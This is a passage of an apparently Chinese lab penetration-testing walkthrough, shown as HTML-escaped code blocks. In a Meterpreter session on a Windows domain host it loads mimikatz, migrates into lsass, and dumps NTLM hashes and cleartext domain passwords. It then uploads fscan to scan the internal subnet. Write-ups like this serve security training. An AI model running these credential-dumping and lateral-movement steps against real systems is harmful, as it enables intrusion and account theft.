class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.136\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e  ...  OK\n\u0026#x3C;style \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e\u003e*{ padding: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; margin: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; } .think_default_text{ padding: 4px 48px;} a{color:\u003cspan class=\"hljs-comment\"\u003e#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }\u0026#x3C;/style\u003e\u0026#x3C;div style=\"padding: 24px 48px;\"\u003e \u0026#x3C;h1\u003e:)\u0026#x3C;/h1\u003e\u0026#x3C;p\u003e ThinkPHP V5\u0026#x3C;br/\u003e\u0026#x3C;span style=\"font-size:30px\"\u003e十年磨一剑 - 为API开发设计的高性能框架\u0026#x3C;/span\u003e\u0026#x3C;/p\u003e\u0026#x3C;span style=\"font-size:22px;\"\u003e[ V5.0 版本由 \u0026#x3C;a href=\"http://www.qiniu.com\" target=\"qiniu\"\u003e七牛云\u0026#x3C;/a\u003e 独家赞助发布 ]\u0026#x3C;/span\u003e\u0026#x3C;/div\u003e\u0026#x3C;script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=9347272\" charset=\"UTF-8\"\u003e\u0026#x3C;/script\u003e\u0026#x3C;script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\"\u003e\u0026#x3C;/script\u003e\u0026#x3C;think id=\"ad_bd568ce7058a1091\"\u003e\u0026#x3C;/think\u003e\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cp\u003e加载\u003ccode\u003emimikatz\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e load kiwi\nLoading extension kiwi...\n  .\u003cspan class=\"hljs-comment\"\u003e#####.   mimikatz 2.2.0 20191125 (x64/windows)\u003c/span\u003e\n .\u003cspan class=\"hljs-comment\"\u003e## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\u003c/span\u003e\n \u003cspan class=\"hljs-string\"\u003e'## v ##'\u003c/span\u003e        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  \u003cspan class=\"hljs-string\"\u003e'#####'\u003c/span\u003e         \u003e http://pingcastle.com / http://mysmartlogon.com  ***/\n\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e挂在\u003ccode\u003eSYSTEM\u003c/code\u003e用户的进程下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ps                                                                                                  \n\nProcess \u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e             \n============                     \n                                                         \n PID   PPID  Name               Arch  Session  User                          Path\n  ---   ----  ----               ----  -------  ----                          ----                           \n \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     [System Process]                                                                                                                                                                                                       \n \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     System             x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                                                                           \n \u003cspan class=\"hljs-number\"\u003e252\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e     smss.exe           x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           \\SystemRoot\\System32\\smss.exe  \n \u003cspan class=\"hljs-number\"\u003e336\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e328\u003c/span\u003e   csrss.exe          x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe                                                                                                                          \n \u003cspan class=\"hljs-number\"\u003e352\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e468\u003c/span\u003e   svchost.exe        x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\system32\\svchost.exe\n \u003cspan class=\"hljs-number\"\u003e388\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e328\u003c/span\u003e   wininit.exe        x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\wininit.exe \n \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e380\u003c/span\u003e   csrss.exe          x64   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n \u003cspan class=\"hljs-number\"\u003e468\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e388\u003c/span\u003e   services.exe       x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\services.exe\n \u003cspan class=\"hljs-number\"\u003e476\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e388\u003c/span\u003e   lsass.exe          x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\lsass.exe  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e migrate \u003cspan class=\"hljs-number\"\u003e476\u003c/span\u003e\n[*] Migrating \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1568\u003c/span\u003e to \u003cspan class=\"hljs-number\"\u003e476.\u003c/span\u003e..\n[*] Migration completed successfully.    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003emimikatz\u003c/code\u003e获得密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e creds_all                                                                                                                                                                                                             \n[+] Running \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e SYSTEM                                                                                                                                                                                                               \n[*] Retrieving \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e credentials                           \nmsv credentials                                          \n===============\nUsername       Domain  LM                                NTLM                              SHA1             \n--------       ------  --                                ----                              ----             \nAdministrator  SUN     c8c42d085b5e3da2e9260223765451f1  e8bea972b3549868cecd667a64a6ac46  3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee                                                                                                 \nWIN7$          SUN                                       8e7d680b96dac27b50e781098dacb63b  c7a665b653036a52a350263fdacd163703a11a9a                                                                                                 \nleo            SUN     b73a13e9b7832a35aad3b435b51404ee  afffeba176210fad4628f0524bfe1942  fa83a92197d9896cb41463b7a917528b4009c650                                                                                                 \n                                                                                                                  \nwdigest credentials                                                                                               \n===================                                                                                               \n                                                                                                                  \nUsername       Domain  Password                                                                                   \n--------       ------  --------                                                                                   \n(null)         (null)  (null)                                                                                                                                                                                                       \nAdministrator  SUN     dc123.com                                                                                  \nWIN7$          SUN     \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e d1 ff bb a7 5d 4d \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e f2 1c 5a \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e 4f 9e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e a7 6e 3e \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e b6 e6 6c 8b \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e bc \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e 7c f9 c3 \u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e aa a0 e0 7c ba \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e f9 \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e d1 \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e f8 d1 f0 cc f7 a4 e7 c8 d8 5f \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e 6d bd f5 fa \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 09 \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e 4f \u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e 8f \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e  \n                        \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e ab f9 2b 6c aa ce a4 b5 7d 06 \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e 6e 07 8e 9f \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 9b \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e cf \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e78\u003c/span\u003e 09 \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e87\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e 09 a2 c8 5c 2d f1 a5 \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e 5e c6 ee 3c \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e 6d 0d b5 \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e af \u003cspan class=\"hljs-number\"\u003e70\u003c/span\u003e f5 \u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e c0 4f 2c 4a d6 0b \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e 9a e8 \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e c7 b3 ae \u003cspan class=\"hljs-number\"\u003e97\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  \n                       \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e dd d5 \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e d9 \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e 01 f1 8a 5c 04 ac d3 1a \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e 7a 9e 5c f0 c9 ed \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e 4f 7a 6a 9c c6 \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e f6 \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e 0c da \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e d6 e9 3a \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e 02 6b e1 \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 8b 1a d5 e3 \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e ec 01 c9 \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e 2c d2 b0 \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e 0b \u003cspan class=\"hljs-number\"\u003e86\u003c/span\u003e 2a 3c 3b \u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e 0a c9 b8   \n                       ae \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e c3 2e 8e 9d db 5c 7b a5 4a \u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e d2 \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e f9 e3 f1 ca 1e 1d \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e b5 \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e fe db \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e 2d a0 ee 08 \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e 2a                                                                                               \nleo            SUN     \u003cspan class=\"hljs-number\"\u003e123.\u003c/span\u003ecom                                                                                    \n                                                                                                                  \ntspkg credentials                                                                                                 \n=================                                                                                                                                                                                                                   \n                                                                                                                  \nUsername       Domain  Password                                                                                                                                                                                                     \n--------       ------  --------                                                                                   \nAdministrator  SUN     dc123.com                                                                                                                                                                                                    \nleo            SUN     \u003cspan class=\"hljs-number\"\u003e123.\u003c/span\u003ecom                                                                                    \n                                                                                                                  \nkerberos credentials                                                                                                                                                                                                                \n====================                                                                                              \n                                                                                                                  \nUsername       Domain   Password                                                                                  \n--------       ------   --------                                                                                  \n(null)         (null)   (null)                                                                                    \nAdministrator  SUN.COM  dc123.com                        \nleo            SUN.COM  \u003cspan class=\"hljs-number\"\u003e123.\u003c/span\u003ecom\nwin7$          SUN.COM  \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e d1 ff bb a7 5d 4d \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e f2 1c 5a \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e 4f 9e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e a7 6e 3e \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e b6 e6 6c 8b \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e bc \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e 7c f9 c3 \u003cspan class=\"hljs-number\"\u003e62\u003c/span\u003e aa a0 e0 7c ba \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e f9 \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e d1 \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e f8 d1 f0 cc f7 a4 e7 c8 d8 5f \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e 6d bd f5 fa \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 09 \u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e 4f \u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e 8f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e  \n                        \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e ab f9 2b 6c aa ce a4 b5 7d 06 \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e 6e 07 8e 9f \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 9b \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e cf \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e78\u003c/span\u003e 09 \u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e87\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e 09 a2 c8 5c 2d f1 a5 \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e 5e c6 ee 3c \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e 6d 0d b5 \u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e af \u003cspan class=\"hljs-number\"\u003e70\u003c/span\u003e f5 \u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e c0 4f 2c 4a d6 0b \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e 9a e8 \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e c7 b3 ae \u003cspan class=\"hljs-number\"\u003e97\u003c/span\u003e  \n                         \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e dd d5 \u003cspan class=\"hljs-number\"\u003e96\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e d9 \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e 01 f1 8a 5c 04 ac d3 1a \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e 7a 9e 5c f0 c9 ed \u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e 4f 7a 6a 9c c6 \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e f6 \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e 0c da \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e d6 e9 3a \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e 02 6b e1 \u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e 8b 1a d5 e3 \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e ec 01 c9 \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e 2c d2 b0 \u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e 0b \u003cspan class=\"hljs-number\"\u003e86\u003c/span\u003e 2a 3c 3b \u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e 0a c9   \n                        b8 ae \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e c3 2e 8e 9d db 5c 7b a5 4a \u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e d2 \u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e f9 e3 f1 ca 1e 1d \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e b5 \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e fe db \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e 2d a0 ee 08 \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e73\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e 2a \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eAdministrator\u003c/code\u003e  \u003ccode\u003edc123.com\u003c/code\u003e  以及 \u003ccode\u003eleo\u003c/code\u003e  \u003ccode\u003e123.com\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e上传\u003ccode\u003efscan\u003c/code\u003e进行探测\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e cd C:/\n\nmeterpreter \u003e upload ~/Desktop/Tools/fscan.exe\n[*] Uploading  : /root/Desktop/Tools/fscan.exe -\u003e fscan.exe\n[*] Uploaded \u003cspan class=\"hljs-number\"\u003e8.00\u003c/span\u003e MiB of \u003cspan class=\"hljs-number\"\u003e8.33\u003c/span\u003e MiB (\u003cspan class=\"hljs-number\"\u003e96.02\u003c/span\u003e%): /root/Desktop/Tools/fscan.exe -\u003e fscan.exe\n[*] Uploaded \u003cspan class=\"hljs-number\"\u003e8.33\u003c/span\u003e MiB of \u003cspan class=\"hljs-number\"\u003e8.33\u003c/span\u003e MiB (\u003cspan class=\"hljs-number\"\u003e100.0\u003c/span\u003e%): /root/Desktop/Tools/fscan.exe -\u003e fscan.exe\n[*] Completed  : /root/Desktop/Tools/fscan.exe -\u003e fscan.exe\n\nmeterpreter \u003e ls\nListing: C:\\\n============\n\nMode              Size     \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e  Last modified              Name\n----              ----     ----  -------------              ----\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:06:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e -0500  $Recycle.Bin\n\u003cspan class=\"hljs-number\"\u003e100444\u003c/span\u003e/r--r--r--  \u003cspan class=\"hljs-number\"\u003e8192\u003c/span\u003e     fil   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:03 -0500  BOOTSECT.BAK\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:03 -0500  Boot\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e-07-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e 01:08:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e -0400  Documents \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Settings\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e-07-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:08 -0400  PerfLogs\n040555/r-xr-xr-x  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e 09:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e -0500  Program Files\n040555/r-xr-xr-x  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2009\u003c/span\u003e-07-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:06 -0400  Program Files (x86)\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e 09:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e -0500  ProgramData\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e -0500  Recovery\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e 09:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:09 -0500  System Volume Information\n040555/r-xr-xr-x  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:07:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e -0500  Users\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e16384\u003c/span\u003e    \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e 08:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e -0500  Windows\n\u003cspan class=\"hljs-number\"\u003e100444\u003c/span\u003e/r--r--r--  \u003cspan class=\"hljs-number\"\u003e383786\u003c/span\u003e   fil   \u003cspan class=\"hljs-number\"\u003e2010\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e -0500  bootmgr\n\u003cspan class=\"hljs-number\"\u003e100777\u003c/span\u003e/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e8736768\u003c/span\u003e  fil   \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e -0500  fscan.exe\n\u003cspan class=\"hljs-number\"\u003e000000\u003c/span\u003e/---------  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        fif   \u003cspan class=\"hljs-number\"\u003e1969\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e -0500  pagefile.sys\n040777/rwxrwxrwx  \u003cspan class=\"hljs-number\"\u003e8192\u003c/span\u003e     \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-03-04 \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e -0500  phpStudy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\\u003efscan.exe -h \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                                                                                 \n┌──────────────────────────────────────────────┐                                                                  \n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ 